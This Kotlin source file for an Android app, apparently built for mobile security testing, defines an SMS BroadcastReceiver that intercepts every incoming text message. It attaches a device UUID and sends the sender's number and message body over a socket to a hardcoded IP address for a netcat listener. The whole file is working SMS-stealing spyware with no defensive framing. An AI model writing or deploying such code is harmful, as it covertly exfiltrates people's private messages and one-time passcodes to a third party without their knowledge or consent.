package com.example.testmobsec

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.AsyncTask
import android.provider.Telephony
import android.util.Log
import java.io.BufferedWriter
import java.io.OutputStreamWriter
import java.net.Socket
import java.util.UUID


// BroadcastReceiver to receive SMS messages
class MessageReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        // Get shared preferences to retrieve or generate UUID
        val sharedPrefs = context!!.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
        var uuid = sharedPrefs.getString("uuid", null)
        // Generate UUID if not found in shared preferences
        if (uuid == null) {
            uuid = UUID.randomUUID().toString()
            sharedPrefs.edit().putString("uuid", uuid).apply()
        }
        // Check if the broadcast intent is for SMS received
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION == intent?.action) {
            // Extract SMS messages from the intent
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            messages?.forEach { smsMessage ->
                // Extract sender's address and message body
                val senderAddress = smsMessage.displayOriginatingAddress
                val message = smsMessage.messageBody
                Log.e("TAG", "Sender's Number: $senderAddress")
                Log.e("TAG", "Message: $message")
                // Prepare data to send to the server
                // Execute the AsyncTask to send the string to the server
                val dataToSend = "\n\nUUID: $uuid\nMessage Received From: $senderAddress\nMessage: $message"
                NetcatCommunicationTask().execute(dataToSend)
            }
        }
    }
    // AsyncTask to handle communication with the server
    private inner class NetcatCommunicationTask : AsyncTask<String, Void, Void>() {
        override fun doInBackground(vararg params: String?): Void? {
            // Define server address and port
            val serverAddress = "13.92.41.98" // Replace with your server's IP address
            val serverPort = 1234 // Replace with the port number your netcat server is listening on
            val message = params[0] // Message to be sent to the server

            try {
                val socket = Socket(serverAddress, serverPort)
                val writer = BufferedWriter(OutputStreamWriter(socket.getOutputStream()))

                // Send the message to the server
                writer.write(message)
                writer.flush()

                // Close the writer and the socket
                writer.close()
                socket.close()

                Log.d("NetcatCommunication", "Message sent successfully")
            } catch (e: Exception) {
                Log.e("NetcatCommunication", "Error: ${e.message}")
            }

            return null
        }
    }

}

